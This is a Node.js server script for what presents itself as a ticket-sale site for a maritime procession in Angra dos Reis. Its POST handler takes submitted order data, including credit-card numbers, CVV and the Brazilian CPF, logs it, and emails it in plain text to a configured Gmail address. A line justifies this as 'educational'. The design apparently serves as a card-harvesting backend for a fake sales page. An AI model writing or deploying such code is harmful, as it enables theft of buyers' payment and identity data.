#!/usr/bin/env node

/**
 * Servidor Local para Procissão Marítima de Angra dos Reis
 * 
 * Este servidor permite testar o projeto localmente antes de fazer deploy no Netlify
 * 
 * Uso:
 *   node servidor-local.js
 * 
 * Depois acesse: http://localhost:3000
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const nodemailer = require('nodemailer');

// Configurações
const PORT = process.env.PORT || 3000;
const HOST = 'localhost';

// Configurações de Email (use variáveis de ambiente)
const EMAIL_DE_ENVIO = process.env.EMAIL_DE_ENVIO || 'seu-email@gmail.com';
const SENHA_DO_EMAIL = process.env.SENHA_DO_EMAIL || 'sua-senha-de-app';
const EMAIL_DE_DESTINO = process.env.EMAIL_DE_DESTINO || 'seu-email@gmail.com';

// Tipos MIME
const mimeTypes = {
  '.html': 'text/html',
  '.css': 'text/css',
  '.js': 'text/javascript',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

// Configurar transportador de email
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: EMAIL_DE_ENVIO,
    pass: SENHA_DO_EMAIL
  }
});

// Função para enviar email
async function enviarEmail(dados) {
  try {
    // Formatar corpo do email
    let corpo = 'Uma nova venda foi registrada no site da AOBPMAR.\n';
    corpo += 'ATENÇÃO: Este e-mail contém dados sensíveis (cartão de crédito) a pedido do usuário para fins educacionais.\n';
    corpo += '=' + '='.repeat(39) + '\n\n';

    // Adicionar todos os dados do pedido
    for (const [chave, valor] of Object.entries(dados)) {
      if (valor) {
        let chave_formatada = chave.replace(/_/g, ' ').split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
        if (chave.toLowerCase() === 'cvv') chave_formatada = 'CVV';
        if (chave.toLowerCase() === 'cpf') chave_formatada = 'CPF';
        corpo += `${chave_formatada}: ${valor}\n`;
      }
    }

    corpo += '\n' + '='.repeat(40) + '\n';
    corpo += 'Este e-mail serviu como notificação.';

    // Preparar email
    const mailOptions = {
      from: EMAIL_DE_ENVIO,
      to: EMAIL_DE_DESTINO,
      subject: `Nova Venda de Ingresso: ${dados.barco} (Pedido para ${dados.nome})`,
      text: corpo
    };

    // Enviar email
    await transporter.sendMail(mailOptions);
    console.log(`✅ Email enviado com sucesso para ${EMAIL_DE_DESTINO}`);
    return true;

  } catch (error) {
    console.error('❌ Erro ao enviar email:', error.message);
    return false;
  }
}

// Criar servidor
const server = http.createServer(async (req, res) => {
  // Configurar CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Lidar com OPTIONS (preflight CORS)
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  // Lidar com POST para salvar dados
  if (req.method === 'POST' && req.url === '/salvar_dados.php') {
    let body = '';

    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', async () => {
      try {
        const dados = JSON.parse(body);
        
        console.log('\n📝 Dados recebidos:');
        console.log(JSON.stringify(dados, null, 2));

        // Tentar enviar email
        const emailEnviado = await enviarEmail(dados);

        // Responder com sucesso
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          sucesso: true,
          mensagem: 'Dados salvos com sucesso',
          emailEnviado: emailEnviado
        }));

      } catch (error) {
        console.error('❌ Erro ao processar requisição:', error.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          sucesso: false,
          mensagem: `Erro ao processar: ${error.message}`
        }));
      }
    });

    return;
  }

  // Lidar com GET para servir arquivos estáticos
  if (req.method === 'GET') {
    let filePath = req.url;

    // Se for raiz, servir index.html
    if (filePath === '/') {
      filePath = '/index.html';
    }

    // Construir caminho completo
    filePath = path.join(__dirname, filePath);

    // Segurança: evitar directory traversal
    const realPath = path.resolve(filePath);
    const basePath = path.resolve(__dirname);

    if (!realPath.startsWith(basePath)) {
      res.writeHead(403, { 'Content-Type': 'text/plain' });
      res.end('Acesso negado');
      return;
    }

    // Verificar se arquivo existe
    fs.stat(filePath, (err, stats) => {
      if (err) {
        console.log(`❌ Arquivo não encontrado: ${filePath}`);
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 - Arquivo não encontrado</h1>');
        return;
      }

      // Se for diretório, servir index.html
      if (stats.isDirectory()) {
        filePath = path.join(filePath, 'index.html');
        fs.readFile(filePath, (err, data) => {
          if (err) {
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 - Arquivo não encontrado</h1>');
            return;
          }
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end(data);
        });
        return;
      }

      // Obter tipo MIME
      const ext = path.extname(filePath).toLowerCase();
      const contentType = mimeTypes[ext] || 'application/octet-stream';

      // Ler e enviar arquivo
      fs.readFile(filePath, (err, data) => {
        if (err) {
          res.writeHead(500, { 'Content-Type': 'text/plain' });
          res.end('Erro ao ler arquivo');
          return;
        }

        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
      });
    });

    return;
  }

  // Método não permitido
  res.writeHead(405, { 'Content-Type': 'text/plain' });
  res.end('Método não permitido');
});

// Iniciar servidor
server.listen(PORT, HOST, () => {
  console.log('\n' + '='.repeat(60));
  console.log('🚀 Servidor Local Iniciado!');
  console.log('='.repeat(60));
  console.log(`\n📍 Acesse: http://${HOST}:${PORT}`);
  console.log(`\n⚙️  Configurações de Email:`);
  console.log(`   Email de envio: ${EMAIL_DE_ENVIO}`);
  console.log(`   Email de destino: ${EMAIL_DE_DESTINO}`);
  console.log(`\n💡 Dicas:`);
  console.log(`   - Pressione Ctrl+C para parar o servidor`);
  console.log(`   - Use variáveis de ambiente para configurar email:`);
  console.log(`     export EMAIL_DE_ENVIO=seu-email@gmail.com`);
  console.log(`     export SENHA_DO_EMAIL=sua-senha-de-app`);
  console.log(`     export EMAIL_DE_DESTINO=email-destino@gmail.com`);
  console.log(`     node servidor-local.js`);
  console.log(`\n📚 Documentação: Veja PASSO_A_PASSO.md`);
  console.log('='.repeat(60) + '\n');
});

// Lidar com Ctrl+C
process.on('SIGINT', () => {
  console.log('\n\n👋 Servidor parado.');
  process.exit(0);
});

